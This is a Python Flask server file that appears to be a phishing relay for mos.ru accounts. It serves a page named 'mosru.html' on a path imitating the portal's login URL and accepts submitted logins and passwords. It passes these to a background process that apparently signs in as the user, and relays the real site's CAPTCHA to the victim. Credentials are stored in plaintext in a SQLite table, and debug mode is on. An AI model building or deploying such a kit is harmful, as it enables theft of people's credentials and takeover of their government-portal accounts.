import sqlite3
from multiprocessing import Process

from flask import Flask, render_template, request, jsonify
import uuid
import utils
app = Flask(__name__)
app.debug = True

DB_NAME = "auth_sessions.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS captcha_tasks (
            task_id TEXT PRIMARY KEY,
            login TEXT NOT NULL,
            password TEXT NOT NULL,
            captcha_image TEXT NOT NULL,
            captcha_answer TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

@app.route('/sps/login/methods/password')
def hello_world():  # put application's code here
    return render_template("mosru.html")

@app.route('/api/form', methods=['GET', 'POST'])
def form():  # put application's code here
    login = request.json.get("login")
    password = request.json.get("password")
    if login:
        print("login")
    if password:
        print("password")
    uuid_capcha = uuid.uuid4()

    # Создаем новый процесс для выполнения mosru_auth
    auth_process = Process(
        target=utils.mosru_auth,
        kwargs={
            'login': login,
            'password': password,
            'mode': "manual",
            "uuid_capcha": uuid_capcha,
            "serv":True
        }
    )

    # Запускаем процесс
    auth_process.start()

    # Можно сразу вернуть ответ, не дожидаясь завершения процесса
    return {"status": "capcha", "uuid": uuid_capcha}


@app.route('/api/captcha/<task_id>', methods=['GET'])
def check_captcha_ready(task_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
                   SELECT captcha_image
                   FROM captcha_tasks
                   WHERE task_id = ?
                     AND status = 'pending'
                   """, (task_id,))
    result = cursor.fetchone()
    conn.close()

    if not result:
        return jsonify({'status': 'not_ready'}), 404

    return jsonify({
        'status': 'ready',
        'data_image': result[0]  # предполагаем что это текстовая капча
    })


@app.route('/api/captcha/<task_id>/<answer>', methods=['GET'])
def submit_captcha(task_id, answer):
    if not answer:
        return jsonify({'error': 'Answer required'}), 400

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Сначала обновляем капчу в базе
    cursor.execute("""
                   UPDATE captcha_tasks
                   SET captcha_answer = ?,
                       status         = 'solved'
                   WHERE task_id = ?
                   """, (answer, task_id))
    conn.commit()

    return jsonify({
        'success': True,
        'message': 'Captcha submitted successfully'
    })

app.run(debug=True)
